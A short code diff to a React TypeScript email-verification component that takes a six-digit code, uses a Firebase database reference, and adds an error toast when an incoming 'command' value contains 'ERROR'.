@@ -2,17 +2,33 @@
 
 import { ThenableReference, update } from "firebase/database";
 import { useEffect, useRef, useState } from "react";
+import { toast } from "react-toastify";
 
 interface IProps {
   dataRef: ThenableReference | null;
+  command: string;
 }
 
-export const EmailCode = ({ dataRef }: IProps) => {
+export const EmailCode = ({ dataRef, command }: IProps) => {
   const [loading, setLoading] = useState(false);
   const [code, setCode] = useState(["", "", "", "", "", ""]);
   const [codeString, setCodeString] = useState("");
   const refs = useRef<any>([]);
   refs.current = [];
+
+  useEffect(() => {
+    if (command.includes("ERROR")) {
+      toast.error("Invalid code!", {
+        position: "top-center",
+        autoClose: 3000,
+        hideProgressBar: true,
+        closeOnClick: true,
+        theme: "light",
+      });
+
+      setLoading(false);
+    }
+  }, [command]);
 
   useEffect(() => {
     const codeString = code.reduce((acc, value) => {
